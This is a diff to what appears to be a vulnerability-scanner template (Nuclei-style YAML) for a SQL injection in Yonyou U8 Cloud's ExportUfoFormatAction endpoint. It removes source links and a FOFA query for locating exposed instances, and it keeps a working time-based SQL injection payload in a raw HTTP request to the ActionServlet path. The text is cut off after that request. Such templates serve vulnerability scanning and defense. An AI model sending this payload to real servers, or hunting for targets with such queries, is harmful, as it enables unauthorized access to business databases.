@@ -3,12 +3,8 @@ info:
   name: 用友U8 Cloud ExportUfoFormatAction存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wr7g40exw9b9mhin'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wr7g40exw9b9mhin
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
